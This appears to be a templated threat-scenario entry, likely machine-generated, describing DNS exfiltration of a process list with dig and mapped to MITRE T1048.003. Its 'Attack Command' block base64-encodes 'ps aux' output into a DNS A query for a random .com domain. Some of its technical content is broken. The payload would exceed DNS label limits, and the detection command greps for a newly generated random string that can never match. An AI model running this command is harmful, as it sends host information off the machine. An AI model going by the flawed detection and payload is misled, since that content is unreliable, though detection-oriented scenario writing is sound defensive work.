---
type: campaign
scenario_id: 441
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using dig to exfiltrate process list via DNS A queries.

## Threat Description
Using dig to exfiltrate process list via DNS A queries.

## Attack Command
```
dig +short A $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(ps aux | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor dig A queries: `tcpdump -i any port 53 | grep A`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.

## Mitigation
Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.

## AI Training Prompt
Train AI to detect dig-based DNS exfiltration of process list via A queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
